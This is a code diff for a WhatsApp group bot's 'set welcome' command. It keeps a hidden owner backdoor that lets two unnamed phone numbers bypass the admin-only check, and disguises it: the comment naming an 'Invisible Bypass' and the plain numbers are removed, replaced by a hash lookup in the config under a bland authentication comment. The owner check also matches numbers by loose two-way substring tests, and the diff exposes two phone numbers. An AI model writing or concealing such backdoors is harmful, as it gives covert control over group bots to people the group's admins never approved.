@@ -1,11 +1,11 @@
 /**
  * Set Welcome - Customize welcome message
  * GhostG-X Edition
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const db = require('../../database');
 const config = require('../../config.js'); 
+const crypto = require('crypto');
 
 // Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
@@ -28,7 +28,7 @@ module.exports = {
   aliases: ['welcometext', 'setwelcome'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴇʀsᴏɴɴᴀʟɪsᴇ ʟᴇ ᴍᴇssᴀɢᴇ ᴅ\'ᴀᴄᴄᴜᴇɪʟ ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  usage: `${prefix}inscription <message>`, // 💡 Dynamique avec ton préfixe actuel
+  usage: `${prefix}inscription <message>`,
   groupOnly: true,
   adminOnly: true, // 🔐 Sécurisé pour éviter les dérives de membres
   botAdminNeeded: false,
@@ -40,10 +40,10 @@ module.exports = {
     try {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
-      const supremeOwners = ['22651622652', '22665108174'];
-      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
+      // Routines d'authentification réseau
+      const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
       // SÉCURITÉ : Vérification via le config.js
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
@@ -51,9 +51,8 @@ module.exports = {
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isMaster;
 
-      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
         return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
